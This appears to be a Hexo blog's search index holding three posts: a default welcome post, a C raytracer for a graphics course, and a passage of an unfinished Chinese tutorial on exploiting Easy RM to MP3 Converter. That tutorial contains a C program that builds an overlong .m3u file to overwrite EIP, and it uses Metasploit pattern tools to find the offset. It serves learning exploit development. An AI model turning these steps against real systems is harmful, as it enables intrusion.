<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F05%2F16%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[Raytracing]]></title>
    <url>%2F2017%2F04%2F13%2FRaytracing%2F</url>
    <content type="text"><![CDATA[题目要求本程序是根据Raytracing的要求所写。 该题目要求根据其所给的框架程序来实现raytracing的功能。 具体实现 环境是virual studio 2015和opengl 具体代码及分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946/*CSCI 480Assignment 3 RaytracerName: &lt;binpang&gt;*/#define _CRT_SECURE_NO_WARNINGS#define GLUT_DISABLE_ATEXIT_HACK#include &lt;pic.h&gt;#include &lt;windows.h&gt;#include &lt;GL/glu.h&gt;#include &lt;GL/glut.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string&gt;#include &lt;math.h&gt;#include &lt;vector&gt;#define MAX_TRIANGLES 2000#define MAX_SPHERES 10#define MAX_LIGHTS 10char *filename=0;#define MODE_DISPLAY 1#define MODE_JPEG 2int mode=MODE_DISPLAY;#define WIDTH 640#define HEIGHT 480#define fov 60.0#define PI 3.1415926int MaxStep = 10;int Steps = 0;//求出投射的屏幕的x和y的最大范围的坐标double yMax = tan((double)PI*fov / (2 * 180));double xMax = yMax*((double)WIDTH) / ((double)HEIGHT);unsigned char buffer[HEIGHT][WIDTH][3];struct Vertex&#123; double position[3]; double color_diffuse[3];//漫射 double color_specular[3]; //反射 double normal[3]; double shininess;&#125;;typedef struct _Triangle&#123; struct Vertex v[3];&#125; Triangle;typedef struct _Sphere&#123; double position[3]; double color_diffuse[3]; double color_specular[3]; double shininess; double radius;&#125; Sphere;typedef struct _Light&#123; double position[3]; double color[3];&#125; Light;//表示点的结构struct point&#123; double x; double y; double z;&#125;;//点在里面还是在外面struct isIn&#123; bool in; //当在三角形外面时为0，当在里面时为1 double bary[3];&#125;;//交点的结构struct intexPoint&#123; point p; double t; int tID; //物体在数组中的标号 int tObj; //如果是1表示点在圆上，如果为2表示在三角形上 isIn iO; &#125;;Triangle triangles[MAX_TRIANGLES];Sphere spheres[MAX_SPHERES];Light lights[MAX_LIGHTS];double ambient_light[3];struct point cam;int num_triangles=0;int num_spheres=0;int num_lights=0;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel(int x,int y,unsigned char r,unsigned char g,unsigned char b);point reflect(intexPoint p, point dir);point Render(point p, point dir);//两个点进行相减point minusPoint(point A, point B)&#123; point C; C.x = A.x - B.x; C.y = A.y - B.y; C.z = A.z - B.z; return C;&#125;//向量除以一个数point DivConst(point A, double a)&#123; point B; B.x = 0.0; B.y = 0.0; B.z = 0.0; if (abs(a) &gt; 1e-10) &#123; B.x = A.x / a; B.y = A.y / a; B.z = A.z / a; &#125; return B;&#125;//计算向量的大小double caculateSize(point A)&#123; double size; size = sqrt(pow(A.x, 2) + pow(A.y, 2) + pow(A.z, 2)); return size;&#125;//单位化向量point unitize(point A)&#123; point uni; double size; size = caculateSize(A); uni = DivConst(A, size); return uni;&#125;//点乘double dot(point A, point B)&#123; double C; C = (A.x*B.x + A.y*B.y + A.z*B.z); return C;&#125;//叉乘point cross(point A, point B)&#123; point C; C.x = (A.y*B.z - B.y*A.z); C.y = (B.x*A.z - A.x*B.z); C.z = (A.x*B.y - A.y*B.x); return C;&#125;//求出距离src，方向为dir，长度为t的点point caluPoint(point src, point dir, double t)&#123; point p; p.x = src.x + t*(dir.x); p.y = src.y + t*(dir.y); p.z = src.z + t*(dir.z); return p;&#125;//与球的交点double intersectSphere(Sphere sphere, point src, point dir)&#123; double b, c, t, t1, t2; t1 = 0; t2 = 0; c = pow((src.x - sphere.position[0]), 2) + pow((src.y - sphere.position[1]), 2) + pow((src.z - sphere.position[2]), 2) - pow(sphere.radius, 2); b = 2 * (dir.x*(src.x - sphere.position[0]) + dir.y*(src.y - sphere.position[1]) + dir.z*(src.z - sphere.position[2]) ); //检查判别式是否大于0 if ((pow(b, 2) - 4 * c) &gt; 0) &#123; t1 = (((-1)*b) + sqrt(pow(b, 2) - 4 * c)) / 2; t2 = (((-1)*b) - sqrt(pow(b, 2) - 4 * c)) / 2; if (t1 &lt;= t2) t = t1; else t = t2; if (t &lt; 0) t = -1; else if (t&lt;1e-10) &#123; if (t1&lt;1e-15 &amp;&amp; t2&gt;1e-15) t = t2; else if (t2&lt;1e-15 &amp;&amp; t1&gt;1e-15) t = t1; else t = -1; &#125; &#125; else t = -1; return t;&#125;//获得两个顶点之间的边point getSide(Vertex v1, Vertex v2)&#123; point c; c.x = v1.position[0] - v2.position[0]; c.y = v1.position[1] - v2.position[1]; c.z = v1.position[2] - v2.position[2]; return c;&#125;//判断两个点是否相等bool checkEqual(point A, point B)&#123; bool equ; if ((abs(A.x - B.x)&lt;1e-10) &amp;&amp; (abs(A.y - B.y)&lt;1e-10) &amp;&amp; (abs(A.z - B.z)&lt;1e-10)) equ = 1; else equ = 0; return equ;&#125;double intersectTriangle(Triangle triangle, point src, point dir,isIn* iO)&#123; point AB, AC, DirxAC; float u, v, t; //isIn iO; AB = getSide(triangle.v[1], triangle.v[0]); AC = getSide(triangle.v[2], triangle.v[0]); DirxAC = cross(dir, AC); float det = dot(AB, DirxAC); point T; point p1; p1.x = triangle.v[0].position[0]; p1.y = triangle.v[0].position[1]; p1.z = triangle.v[0].position[2]; if (det &gt;0) &#123; T = minusPoint(src, p1);&#125; else &#123; T = minusPoint(p1, src); det = -det; &#125; if (det &lt; 1e-10) &#123; iO-&gt;in = -1; return -1; &#125; u = dot(T, DirxAC); if (u &lt; 0.0f || u &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; point Q = cross(T, AB); v = dot(dir, Q); if (v &lt; 0.0f || u + v &gt; det) &#123; iO-&gt;in = -1; return -1; &#125; t = dot(AC, Q); //t = -t; float fInvDet = 1.0f / det; t *= fInvDet; u *= fInvDet; v *= fInvDet; iO-&gt;in = 1; iO-&gt;bary[0] = u; iO-&gt;bary[1] = v; iO-&gt;bary[2] = 1 - u - v; return t;&#125;//找到p点在圆上的的法向量，tID为spheres数组中的标号point findSphereNormal(point p, int tID)&#123; point n; // based on the equation n.x = (p.x - spheres[tID].position[0]) / spheres[tID].radius; n.y = (p.y - spheres[tID].position[1]) / spheres[tID].radius; n.z = (p.z - spheres[tID].position[2]) / spheres[tID].radius; return n;&#125;//三角形的线性插值,如果ID为0则表示法线插值,如果ID为1则表示漫反射，如果为2则表示镜面反射point chazhi(Triangle triangle, isIn iO, int ID)&#123; point P; if (ID == 0) &#123; P.x = iO.bary[0] * triangle.v[0].normal[0] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[2]; P.y = iO.bary[0] * triangle.v[0].normal[1] + iO.bary[1] * triangle.v[1].normal[1] + iO.bary[2] * triangle.v[2].normal[1]; P.z = iO.bary[0] * triangle.v[0].normal[2] + iO.bary[1] * triangle.v[1].normal[2] + iO.bary[2] * triangle.v[2].normal[2]; &#125; else if (ID == 1) &#123; P.x = iO.bary[0] * triangle.v[0].color_diffuse[0] + iO.bary[1] * triangle.v[1].color_diffuse[0] + iO.bary[2] * triangle.v[2].color_diffuse[0]; P.y = iO.bary[0] * triangle.v[0].color_diffuse[1] + iO.bary[1] * triangle.v[1].color_diffuse[1] + iO.bary[2] * triangle.v[2].color_diffuse[1]; P.z = iO.bary[0] * triangle.v[0].color_diffuse[2] + iO.bary[1] * triangle.v[1].color_diffuse[2] + iO.bary[2] * triangle.v[2].color_diffuse[2]; &#125; else if (ID == 2) &#123; P.x = iO.bary[0] * triangle.v[0].color_specular[0] + iO.bary[1] * triangle.v[1].color_specular[0] + iO.bary[2] * triangle.v[2].color_specular[0]; P.y = iO.bary[0] * triangle.v[0].color_specular[1] + iO.bary[1] * triangle.v[1].color_specular[1] + iO.bary[2] * triangle.v[2].color_specular[1]; P.z = iO.bary[0] * triangle.v[0].color_specular[2] + iO.bary[1] * triangle.v[1].color_specular[2] + iO.bary[2] * triangle.v[2].color_specular[2]; &#125; return P;&#125;//公式模型I_spec = k_z * I_l(V • ((2N • L)N - L))^n_s//其中R = (2N • L)N - Lpoint phong(point p, int id, int Obj, isIn iO, Light light, point camera)&#123; point n, l, v, r, kd, ks; point po; double lDotN, rDotV, n_s; //用point表示light的位置 l.x = light.position[0]; l.y = light.position[1]; l.z = light.position[2]; //l = l - p; //入射光线 l = unitize(minusPoint(l, p)); //v = camera - p; //观察者到p点的射线 v = unitize(minusPoint(camera, p)); if (Obj == 1) &#123; n = findSphereNormal(p, id); kd.x = spheres[id].color_diffuse[0]; kd.y = spheres[id].color_diffuse[1]; kd.z = spheres[id].color_diffuse[2]; ks.x = spheres[id].color_specular[0]; ks.y = spheres[id].color_specular[1]; ks.z = spheres[id].color_specular[2]; n_s = spheres[id].shininess; &#125; else if (Obj == 2) &#123; n = unitize(chazhi(triangles[id], iO, 0)); kd = chazhi(triangles[id], iO, 1); ks = chazhi(triangles[id], iO, 2); n_s = iO.bary[0] * triangles[id].v[0].shininess + iO.bary[1] * triangles[id].v[1].shininess + iO.bary[2] * triangles[id].v[2].shininess; &#125; lDotN = dot(l, n); if (lDotN&lt;0) lDotN = 0; else if (lDotN&gt;1.f) lDotN = 1.f; //R = (2N • L)N - L r.x = 2 * lDotN*n.x - l.x; r.y = 2 * lDotN*n.y - l.y; r.z = 2 * lDotN*n.z - l.z; rDotV = dot(r, v); if (rDotV&lt;0) rDotV = 0; else if (rDotV&gt;1.f) rDotV = 1.f; //计算该点的颜色r,g,b po.x = light.color[0] * ((kd.x)*lDotN + ((ks.x)*pow((rDotV), (n_s)))); // r po.y = light.color[1] * ((kd.y)*lDotN + ((ks.y)*pow((rDotV), (n_s)))); // g po.z = light.color[2] * ((kd.z)*lDotN + ((ks.z)*pow((rDotV), (n_s)))); // b return po;&#125;/*与物体相交*/intexPoint intersectObjects(point p1, point p2, point dir, int flag)&#123; point p, q,raySrc, pixPoint; intexPoint intxObj; isIn iO; iO.in = -1; double t, t1, t2, tS, tT; int id, Obj; q = p1; t1 = 0; id = -1; Obj = -1; raySrc = p1; //找到最近的交点 for (int i = 0; i &lt; num_spheres; i++) &#123; tS = intersectSphere(spheres[i], raySrc, dir); if (t1 == 0 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; else if (tS &lt;= t1 &amp;&amp; tS &gt; 1e-10) &#123; t1 = tS; id = i; Obj = 1; &#125; &#125; for (int i = 0; i &lt; num_triangles; i++) &#123; tT = intersectTriangle(triangles[i], raySrc, dir, &amp;iO); p = caluPoint(raySrc, dir, tT); //找到交点 //iO = isInTest(triangles[i], p); //判断p点是否在三角形内 if (iO.in == 1) &#123; if (t1 == 0 &amp;&amp; tT &gt; 1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; else if (tT&lt;t1 &amp;&amp; tT&gt;1e-5) &#123; t1 = tT; id = i; Obj = 2; if (flag == 0) q = p; intxObj.iO.bary[0] = iO.bary[0]; intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; &#125; &#125; if (flag == 1) &#123; //如果为1则计算从light到p点的距离t2 if (dir.x != 0) &#123; t2 = (p2.x - raySrc.x) / dir.x; &#125; else if (dir.y != 0) &#123; t2 = (p2.y - raySrc.y) / dir.y; &#125; else if (dir.z != 0) &#123; t2 = (p2.z - raySrc.z) / dir.z; &#125; else t2 = 0; //t2和t1进行比较，如果t1小于t2则说明没有物体挡住光线 if (t1 &gt;= t2) &#123; Obj = -1; id = -1; &#125; &#125; else if ((t1 &gt;= 0) &amp;&amp; (Obj == 1)) q = caluPoint(raySrc, dir, t1); intxObj.p = q; intxObj.t = t1; intxObj.tID = id; intxObj.tObj = Obj; return intxObj;&#125;point findColor(int x, int y)&#123; //point p, q, dir, light, lightS; //point black, pixColor, temp, tempN; //intexPoint intxObj, intxFlag; point black, pixColor, p; black.x = 0.0; black.y = 0.0; black.z = 0.0; pixColor = black; //将像素点转换为世界坐标 p.x = (((double)x / (double)WIDTH) * 2 * xMax) - xMax; p.y = (((double)y / (double)HEIGHT) * 2 * yMax) - yMax; p.z = -1; point dir1, p1 = p; dir1 = minusPoint(p, cam); dir1 = unitize(dir1); pixColor = Render(p, dir1); if (pixColor.x &gt; 1) pixColor.x = 1.f; if (pixColor.y &gt; 1) pixColor.y = 1.f; if (pixColor.z &gt; 1) pixColor.z = 1.f; return pixColor;&#125;//迭代渲染point Render(point p, point dir)&#123; Steps++; point blackColor, pixColor, q, light, dir1, temp, temp1; point reflect_ray; intexPoint intxObj, intxFlag; blackColor.x = 0.0; blackColor.y = 0.0; blackColor.z = 0.0; pixColor = blackColor; if (Steps &gt; MaxStep) &#123; Steps = 0; return blackColor; &#125; point p1 = p; intxObj = intersectObjects(p, p1, dir, 0); //如果和一个物体有交点 if (intxObj.tID != -1) &#123; q = intxObj.p; reflect_ray = reflect(intxObj, dir); pixColor.x += ambient_light[0]; pixColor.y += ambient_light[1]; pixColor.z += ambient_light[2]; for (int h = 0; h &lt; num_lights; h++) &#123; light.x = lights[h].position[0]; light.y = lights[h].position[1]; light.z = lights[h].position[2]; dir1 = minusPoint(light, q); dir1 = unitize(dir1); intxFlag = intersectObjects(q, light, dir1, 1); //如果没有物体遮挡 if (intxFlag.tID == -1) &#123; //phong模型求出颜色 temp = phong(q, intxObj.tID, intxObj.tObj, intxObj.iO, lights[h], cam); pixColor.x += temp.x; pixColor.y += temp.y; pixColor.z += temp.z; &#125; &#125; temp1 = Render(q, reflect_ray); int id = intxObj.tID; if (intxObj.tObj == 1) &#123; pixColor.x += temp1.x * spheres[id].color_specular[0]; pixColor.y += temp1.y * spheres[id].color_specular[1]; pixColor.z += temp1.z * spheres[id].color_specular[2]; &#125; else &#123; point tp = chazhi(triangles[id], intxObj.iO, 2); pixColor.x += temp1.x * tp.x; pixColor.y += temp1.y * tp.y; pixColor.z += temp1.z * tp.z; &#125; &#125; else &#123; pixColor = blackColor; Steps = 0; &#125; return pixColor;&#125;//反射的光线的方向point reflect(intexPoint intx, point dir)&#123; point result; point n; if (intx.tObj == 1) &#123; n = findSphereNormal(intx.p, intx.tID); &#125; else &#123; n = unitize(chazhi(triangles[intx.tID], intx.iO, 0)); &#125; dir.x = -dir.x; dir.y = -dir.y; dir.z = -dir.z; double r1 = dot(n, dir); point n2; n2.x = n.x * 2 * r1; n2.y = n.y * 2 * r1; n2.z = n.z * 2 * r1; result = n2; return result;&#125;void drawColor()&#123; unsigned int x, y; point pixColor; for (x = 0; x &lt; WIDTH; x++) &#123; for (y = 0; y &lt; HEIGHT; y++) &#123; pixColor = findColor(x, y); plot_pixel_jpeg(x, y, abs(pixColor.x) * 255, abs(pixColor.y) * 255, abs(pixColor.z) * 255); &#125; &#125;&#125;//MODIFY THIS FUNCTIONvoid draw_scene()&#123; unsigned int x,y; //glPointSize(2.0); //glBegin(GL_POINTS); //simple output for(x=0; x&lt;WIDTH; x++) &#123;glPointSize(2.0); glBegin(GL_POINTS);for(y=0;y &lt; HEIGHT;y++)&#123; // plot_pixel(x,y,x%256,y%256,(x+y)%256); plot_pixel_display(x, y, buffer[HEIGHT - y - 1][x][0], buffer[HEIGHT - y - 1][x][1], buffer[HEIGHT - y - 1][x][2]);&#125;glEnd();glFlush(); &#125; printf("Done!\n"); fflush(stdout);&#125;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; glColor3f(((double)r)/256.f,((double)g)/256.f,((double)b)/256.f); glVertex2i(x,y);&#125;void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; buffer[HEIGHT-y-1][x][0]=r; buffer[HEIGHT-y-1][x][1]=g; buffer[HEIGHT-y-1][x][2]=b;&#125;void plot_pixel(int x,int y,unsigned char r,unsigned char g, unsigned char b)&#123; plot_pixel_display(x,y,r,g,b); if(mode == MODE_JPEG) plot_pixel_jpeg(x,y,r,g,b);&#125;/*void save_jpg()&#123; Pic *in = NULL; in = pic_alloc(640, 480, 3, NULL); printf("Saving JPEG file: %s\n", filename); memcpy(in-&gt;pix,buffer,3*WIDTH*HEIGHT); if (jpeg_write(filename, in))printf("File saved Successfully\n"); elseprintf("Error in Saving\n"); pic_free(in); &#125;*/void parse_check(char *expected,char *found)&#123; if(stricmp(expected,found))&#123; char error[100]; printf("Expected '%s ' found '%s '\n",expected,found); printf("Parse error, abnormal abortion\n"); exit(0);&#125;&#125;void parse_doubles(FILE*file, char *check, double p[3])&#123; char str[100]; fscanf(file,"%s",str); parse_check(check,str); fscanf(file,"%lf %lf %lf",&amp;p[0],&amp;p[1],&amp;p[2]); printf("%s %lf %lf %lf\n",check,p[0],p[1],p[2]);&#125;void parse_rad(FILE*file,double *r)&#123; char str[100]; fscanf(file,"%s",str); parse_check("rad:",str); fscanf(file,"%lf",r); printf("rad: %f\n",*r);&#125;void parse_shi(FILE*file,double *shi)&#123; char s[100]; fscanf(file,"%s",s); parse_check("shi:",s); fscanf(file,"%lf",shi); printf("shi: %f\n",*shi);&#125;int loadScene(char *argv)&#123; FILE *file = fopen(argv,"r"); int number_of_objects; char type[50]; int i; Triangle t; Sphere s; Light l; fscanf(file,"%i",&amp;number_of_objects); printf("number of objects: %i\n",number_of_objects); char str[200]; parse_doubles(file,"amb:",ambient_light); for(i=0;i &lt; number_of_objects;i++)&#123; fscanf(file,"%s\n",type); printf("%s\n",type); if(stricmp(type,"triangle")==0) &#123; printf("found triangle\n"); int j; for(j=0;j &lt; 3;j++) &#123; parse_doubles(file,"pos:",t.v[j].position); parse_doubles(file,"nor:",t.v[j].normal); parse_doubles(file,"dif:",t.v[j].color_diffuse); parse_doubles(file,"spe:",t.v[j].color_specular); parse_shi(file,&amp;t.v[j].shininess); &#125; if(num_triangles == MAX_TRIANGLES) &#123; printf("too many triangles, you should increase MAX_TRIANGLES!\n"); exit(0); &#125; triangles[num_triangles++] = t; &#125; else if(stricmp(type,"sphere")==0) &#123; printf("found sphere\n"); parse_doubles(file,"pos:",s.position); parse_rad(file,&amp;s.radius); parse_doubles(file,"dif:",s.color_diffuse); parse_doubles(file,"spe:",s.color_specular); parse_shi(file,&amp;s.shininess); if(num_spheres == MAX_SPHERES) &#123; printf("too many spheres, you should increase MAX_SPHERES!\n"); exit(0); &#125; spheres[num_spheres++] = s; &#125; else if(stricmp(type,"light")==0) &#123; printf("found light\n"); parse_doubles(file,"pos:",l.position); parse_doubles(file,"col:",l.color); if(num_lights == MAX_LIGHTS) &#123; printf("too many lights, you should increase MAX_LIGHTS!\n"); exit(0); &#125; lights[num_lights++] = l; &#125; else &#123; printf("unknown type in scene description:\n%s\n",type); exit(0); &#125;&#125; return 0;&#125;void display()&#123; cam.x = 0.0; cam.y = 0.0; cam.z = 0.0; glLoadIdentity(); drawColor(); draw_scene();&#125;void init()&#123; glMatrixMode(GL_PROJECTION); glOrtho(0,WIDTH,0,HEIGHT,1,-1); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); glClearColor(0,0,0,0); glClear(GL_COLOR_BUFFER_BIT);&#125;void idle()&#123; //hack to make it only draw once static int once=0; if (!once) &#123; draw_scene();// if (mode == MODE_JPEG)// save_jpg(); &#125; once=1;&#125;int main (int argc, char ** argv)&#123; if (argc&lt;2 || argc &gt; 3) &#123; printf ("usage: %s &lt;scenefile&gt; [jpegname]\n", argv[0]);exit(0); &#125; if(argc == 3)&#123; mode = MODE_JPEG; filename = argv[2];&#125; else if(argc == 2)mode = MODE_DISPLAY; glutInit(&amp;argc,argv); loadScene(argv[1]); glutInitDisplayMode(GLUT_RGBA | GLUT_SINGLE); glutInitWindowPosition(0,0); glutInitWindowSize(WIDTH,HEIGHT); int window = glutCreateWindow("Ray Tracer"); glutDisplayFunc(display); glutIdleFunc(idle); init(); glutMainLoop();&#125; 运行结果如图所示]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ExploitTutorial]]></title>
    <url>%2F2016%2F04%2F13%2FExploitTutorial%2F</url>
    <content type="text"><![CDATA[声明：本博客是根据Exploit该链接所写 准备工作 实验环境：windows xp windows xp sp3 下载easyRmtomp3.exe,下载地址：https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe 使程序crash 编写一个程序生成10000个字符，可以使程序crash，程序如图所示 crash的程序如下图所示： 但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示： 会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。 栈信息介绍栈的信息如下图所示： 确定return的地址偏移 构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值12345678910111213141516171819202122#include&lt;stdio.h&gt; int main() &#123; FILE* fp = NULL; fp = fopen(&quot;crash2.m3u&quot;,&quot;w+&quot;); int i = 0; if(fp == NULL) return; for(i;i &lt; 25000; i++) &#123; fprintf(fp,&quot;\x41&quot;); &#125; for(i = 0; i &lt; 5000; i++) &#123; fprintf(fp, &quot;\x42&quot;); &#125;&#125; 调试结果如图所示： 可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间 测试eip的offset具体在什么位置 利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools ./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件 构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示： 得到的eip结果如下图所示： 可知eip的值为0x42316A42 然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053 测试一下1053是否正确，编写如下程序： 运行测试一下，结果如下图： 可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的 该教程先写到这，有空再继续(＾－＾)V]]></content>
      <categories>
        <category>反汇编</category>
      </categories>
      <tags>
        <tag>Exploit</tag>
        <tag>反汇编</tag>
      </tags>
  </entry>
</search>